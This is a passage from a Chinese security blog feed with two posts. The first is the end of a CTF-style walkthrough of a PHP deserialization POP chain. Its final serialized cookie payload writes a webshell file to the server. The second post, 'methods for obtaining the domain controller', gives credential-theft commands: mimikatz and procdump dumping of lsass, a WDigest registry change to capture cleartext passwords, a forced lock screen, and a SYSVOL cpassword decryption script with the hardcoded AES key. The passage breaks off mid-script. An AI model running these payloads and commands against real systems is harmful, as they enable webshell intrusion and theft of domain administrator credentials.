punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logger</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Song "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">" by [i]"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span> <span class="token punctuation">.</span> <span class="token string">"[/i] viewed.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Lyrics</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$song</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lyrics</span><span class="token punctuation">,</span> <span class="token variable">$song</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span> <span class="token operator">=</span> <span class="token variable">$song</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span> <span class="token operator">=</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>&lt;p>"</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">shortForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>&lt;a href='song.php?name="</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>song<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">name_is</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">addLyrics</span><span class="token punctuation">(</span><span class="token variable">$lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$oldlyrics</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$oldlyrics</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$lyrics</span> <span class="token keyword">as</span> <span class="token variable">$lyric</span><span class="token punctuation">)</span> <span class="token variable">$oldlyrics</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token variable">$lyric</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'lyrics'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$oldlyrics</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getLyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'lyrics'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>User<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getLyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在进行反序列化漏洞的时候，我们需要找到可控的unserialize，这里发现$_COOKIE[‘lyrics’]参数可控，有了可控的参数，就需要找到魔术方法来自动调用，这里危险函数在LogWriter_File这个类，这时就需要构造POP链了。</p><p>首先来看魔术方法，在Lyrics类中存在两个魔术方法，发现对象在销毁的时候调用了$this-&gt;song-&gt;log()，而log方法又在Logger这个类中存在，所以属性$this-&gt;song应该为new Logger()。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Lyrics</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$song</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>&lt;p>"</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">shortForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>&lt;a href='song.php?name="</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>song<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">name_is</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>继续找，当实例化对象Lyricsde时，log方法存在$this-&gt;logwriter-&gt;writeLog，而writeLog又存在于LogWriter_File类中，这好这个类是我们的漏洞触发点，所以$this-&gt;logwriter应该为new LogWriter_Fil()，构造下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logwriter</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogWriter_File</span><span class="token punctuation">(</span><span class="token string">'123.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>实例化对象Logger之后，调用了LogWriter_File的writeLog方法，而写入文件的txt是通过$this-&gt;format-&gt;format获得，而format方法存在类LogFileFormat中，所以，构造如下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">LogWriter_File</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogFileFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 111</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//TODO: Modify the address here, and delete this TODO.</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"D:\\phpStudy\\WWW\\ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>在类LogFileFormat中的format方法中利用$filter-&gt;filter来获取的$txt，而$filter是通过foreach获取的，所以$this-&gt;filters为一个数组，最终OutputFilter传入写入文件的内容，就可以构造如下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">OutputFilter</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$matchPattern</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$replacement</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span> <span class="token operator">=</span> '<span class="token comment" spellcheck="true">//';</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span> <span class="token operator">=</span> <span class="token string">'&lt;?= `whoami`?>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogFileFormat</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OutputFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 111</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>最后，将payload组合起来，利用serialize输出下序列化的结果</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/4.png" alt="4" loading="lazy"></p><pre><code>O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22111%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A7%3A%22123.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A14%3A%22%3C%3F%3D+%60whoami%60%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D</code></pre><p>在base64下通过cookie传入就可以写入ctf123.php了</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/5.png" alt="5" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/</a></p><p>2.<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-9</a></p><p>3.<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;&lt;strong&gt;序列化与反序列化&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在php中，使用serialize和unserialize
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>获取域控的方法</title>
    <link href="http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2020-02-26T10:35:58.000Z</published>
    <updated>2020-02-26T10:48:00.083Z</updated>
    
    <content type="html"><![CDATA[<h4 id="高权限读取本地密码"><a href="#高权限读取本地密码" class="headerlink" title="高权限读取本地密码"></a><strong>高权限读取本地密码</strong></h4><p>当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的lsass.exe，可以通过mimikatz来读取到本地的明文密码。</p><pre><code>privilege::debug  # 提权sekurlsa::logonpasswords</code></pre><p>如果主机存在杀软的时候，上传mimikatz很多时候都会被杀掉，可以通过<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">procdump</a>+mimikatz的方式进行绕过。先导出lsass.exe</p><pre><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>保存到本地，通过mimikatz读lsass.dmp的明文</p><pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;  &gt; 1.txt</code></pre><p>如果目标机器是windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录及可以读取明文。</p><p>添加注册表，设置UseLogonCredential设置为1</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p>利用powershell脚本进行锁屏</p><pre><code>Function Lock-WorkStation {$signature = @&quot;[DllImport(&quot;user32.dll&quot;, SetLastError = true)]public static extern bool LockWorkStation();&quot;@$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru$LockWorkStation::LockWorkStation() | Out-Null}Lock-WorkStation</code></pre><p>管理员重新登录后就可以抓取到明文密码了。</p><h4 id="SYSVOL还原组策略"><a href="#SYSVOL还原组策略" class="headerlink" title="SYSVOL还原组策略"></a><strong>SYSVOL还原组策略</strong></h4><p>在域环境中，有个默认的共享路径</p><pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>SYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">私钥</a>。</p><p>可以利用powershell解密密文:</p><pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Get<span class="token operator">-</span>DecryptedCpassword <span class="token punctuation">{</span>    <span class="token namespace">[CmdletBinding()]</span>    <span class="token keyword">Param</span> <span class="token punctuation">(</span>        <span class="token namespace">[string]</span> <span class="token variable">$Cpassword</span>    <span class="token punctuation">)</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">#Append appropriate padding based on string length  </span>        <span class="token variable">$Mod</span> = <span class="token punctuation">(</span><span class="token variable">$Cpassword</span><span class="token punctuation">.</span>length <span class="token operator">%</span> 4<span class="token punctuation">)</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$Mod</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token string">'1'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> = <span class="token variable">$Cpassword</span><span class="token punctuation">.</span>Substring<span class="token punctuation">(</span>0<span class="token punctuation">,</span><span class="token variable">$Cpassword</span><span class="token punctuation">.</span>Length <span class="token operator">-</span>1<span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token string">'2'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span>4 <span class="token operator">-</span> <span class="token variable">$Mod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token string">'3'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span>4 <span class="token operator">-</span> <span class="token variable">$Mod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$Base64Decoded</span> = <span class="token namespace">[Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$Cpassword</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Create a new AES .NET Crypto Object</span>        <span class="token variable">$AesObject</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>Cryptography<span class="token punctuation">.</span>AesCryptoServiceProvider        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span> <span class="token variable">$AesKey</span> = @<span class="token punctuation">(</span>0x4e<span class="token punctuation">,</span>0x99<span class="token punctuation">,</span>0x06<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>0xfc<span class="token punctuation">,</span>0xb6<span class="token punctuation">,</span>0x6c<span class="token punctuation">,</span>0xc9<span class="token punctuation">,</span>0xfa<span class="token punctuation">,</span>0xf4<span class="token punctuation">,</span>0x93<span class="token punctuation">,</span>0x10<span class="token punctuation">,</span>0x62<span class="token punctuation">,</span>0x0f<span class="token punctuation">,</span>0xfe<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>                             0xf4<span class="token punctuation">,</span>0x96<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>0x06<span class="token punctuation">,</span>0xcc<span class="token punctuation">,</span>0x05<span class="token punctuation">,</span>0x79<span class="token punctuation">,</span>0x90<span class="token punctuation">,</span>0x20<span class="token punctuation">,</span>0x9b<span class="token punctuation">,</span>0x09<span class="token punctuation">,</span>0xa4<span class="token punctuation">,</span>0x33<span class="token punctuation">,</span>0xb6<span class="token 